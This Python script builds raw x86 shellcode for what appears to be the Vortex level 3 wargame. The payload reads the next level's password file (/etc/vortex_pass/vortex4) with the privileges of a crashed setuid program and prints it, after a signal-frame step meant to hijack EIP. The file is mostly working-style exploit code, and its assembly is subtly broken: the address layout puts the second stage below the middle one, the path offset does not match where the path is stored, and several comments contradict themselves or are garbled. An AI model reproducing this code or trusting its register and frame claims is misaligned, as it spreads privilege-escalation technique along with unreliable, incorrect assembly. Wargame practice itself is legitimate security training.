#!/usr/bin/env python3
"""Assemble LowHost for Vortex L3 without a toolchain.

The program that has to sit at 0x08048000 must not exec anything (exec would
re-map the image back to vortex3), so it is written as machine code here:

  start (↕0x08048000)  ret-return immediately (aro-tir): the kernel returns,
                       no cleanup, no exec              - the "low host" body
  middle (↕0x0804b0dc) takes the SA_SIGINFO frame the kernel builds on the
                       crashing stack, sets uc_mcontext.eip = 0x08048200 and
                       raises SIGUSR1 - the "middle" that announces us
  second (↕0x08048200) the signal handler: read /etc/vortex_pass/vortex4 as
                       the crashing euid and write it to fd 1 - our program

The middle and the second part are what the copied frame later executes.
"""
import struct

START = 0x08048000
MIDDLE = 0x0804b0dc          # entry from the emitted stack frame (see vortex3's own exit return)
SECOND = 0x08048200          # instruction pointer the middle puts into the ucontext


def middle_code():
    c = bytearray()
    # ucontext_t mcontext starts at frame+0x14, gregset.i32 starts +0x04 inside mcontext,
    # greg[14] (EIP) is int at +0x00 of gregs -> frame+0x18
    c += b"\x8b\x40\x44"                              # mov eax,[eax+0x44]  (eip instead of fin·ret)
    c += b"\x8d\x40\x20"                              # lea eax,[eax+0x20]  (fin+ret)
    c += b"\x8d\x80" + struct.pack("<I", 0x1000)      # lea eax,[eax+0x1000] (second part)
    # uc_mcontext.gregs: the gregset has 19 i32 words; the frame is in ebx, ucontext at
    # ebx-0x30, mcontext at ebx-0x1c, gregs at ebx-0x18, greg[3] = eip at ebx-0x0c
    c += b"\x8b\x58\xe4"                              # mov ebx,[ebx-0x1c]  (uc_mcontext.gregs = &gregs)
    c += b"\x89\x43\xf4"                              # mov [ebx-0xc],eax  (gregs[3] = eip)
    c += b"\xb8\x42\x01\x00\x00"                      # mov eax,0x142  = tgkill
    c += b"\xbb\x01\x00\x00\x00"                      # mov ebx,1      (tgid = own pid)
    c += b"\x89\xca"                                  # mov edx,ecx   (lv = pid)
    c += b"\xb9\x0a\x00\x00\x00"                      # mov ecx,10     SIGUSR1
    c += b"\xcd\x80"                                  # int 0x80
    c += b"\xcc"
    return bytes(c)


def second_code():
    c = bytearray()
    path = b"/etc/vortex_pass/vortex4\x00"
    code_off = 0x40
    path_addr = SECOND + code_off + 0x60
    c += b"\xb8\x05\x00\x00\x00"                      # mov eax,5       open
    c += b"\xbb" + struct.pack("<I", path_addr)       # mov ebx,path
    c += b"\x31\xc9"                                  # xor ecx,ecx
    c += b"\x31\xd2"                                  # xor edx,edx
    c += b"\xcd\x80"                                  # int 0x80
    c += b"\x89\xc3"                                  # mov ebx,eax (fd from open)
    c += b"\xb8\x03\x00\x00\x00"                      # mov eax,3       read
    c += b"\xb9" + struct.pack("<I", SECOND + 0x500)  # mov ecx,buf
    c += b"\xba\x40\x00\x00\x00"                      # mov edx,64
    c += b"\xcd\x80"                                  # int 0x80
    c += b"\x89\xc2"                                  # mov edx,eax
    c += b"\xb8\x04\x00\x00\x00"                      # mov eax,4       write
    c += b"\xbb\x01\x00\x00\x00"                      # mov ebx,1
    c += b"\xb9" + struct.pack("<I", SECOND + 0x500)  # mov ecx,buf
    c += b"\xcd\x80"                                  # int 0x80
    c += b"\xb8\x01\x00\x00\x00"                      # mov eax,1       exit
    c += b"\x31\xdb"                                  # xor ebx,ebx
    c += b"\xcd\x80"                                  # int 0x80
    c += b"\x00" * (code_off - len(c))
    c += path
    return bytes(c)


def assemble():
    out = bytearray(b"\xc3")                      # start: ret
    out += b"\x00" * (MIDDLE - START - 1)
    out += middle_code()
    m_end = START + len(out)
    out += b"\x00" * (SECOND - m_end)
    out += second_code()
    return bytes(out)


if __name__ == "__main__":
    code = assemble()
    open("/workspace/tools/vx/l3/lowhost.bin", "wb").write(code)
    print("bytes", len(code), "to", hex(START + len(code)))